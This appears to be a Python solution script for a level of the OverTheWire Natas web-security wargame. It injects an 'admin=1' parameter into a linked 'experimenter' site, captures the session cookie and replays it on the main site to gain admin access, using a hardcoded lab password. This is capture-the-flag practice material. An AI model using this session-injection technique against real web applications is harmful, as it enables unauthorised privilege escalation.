#!bin/python3
import requests
import binascii

url = "http://natas21.natas.labs.overthewire.org/"
c_url = "http://natas21-experimenter.natas.labs.overthewire.org"
auth_username = "natas21"
auth_password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"

params = dict(debug='',align="left",fontsize='50%',bgcolor='red',submit='update',admin=1)
cookies = dict()

r = requests.get(c_url,auth=(auth_username,auth_password),params=params)
print(f'{r.text}\n{r.cookies}')
phpsessid = r.cookies['PHPSESSID']
print(phpsessid)

params = dict(debug='')
cookies = dict(PHPSESSID=phpsessid)
r = requests.get(url,auth=(auth_username,auth_password),cookies=cookies)
print(f'{r.text}\n{r.cookies}')

